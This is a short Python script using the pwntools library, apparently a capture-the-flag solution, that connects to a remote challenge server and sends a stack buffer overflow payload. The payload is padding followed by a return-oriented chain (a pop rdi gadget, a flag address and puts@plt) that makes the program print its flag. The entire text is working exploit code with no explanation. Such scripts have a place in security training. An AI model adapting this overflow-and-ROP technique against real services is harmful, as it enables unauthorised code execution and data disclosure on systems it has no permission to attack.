from pwn import *


#chall = process('./chall')
chall = remote('challs.xmas.htsp.ro',12006)
context.log_level = 'DEBUG'
context.arch = 'amd64'
flag = 0x402010
put_plt = 0x401030
pop_rdi = 0x401273

p = 'A'* (0xA + 8)
p += p64(pop_rdi)
p += p64(flag)
p += p64(put_plt)
chall.sendlineafter('snowmen?',p)
chall.interactive()

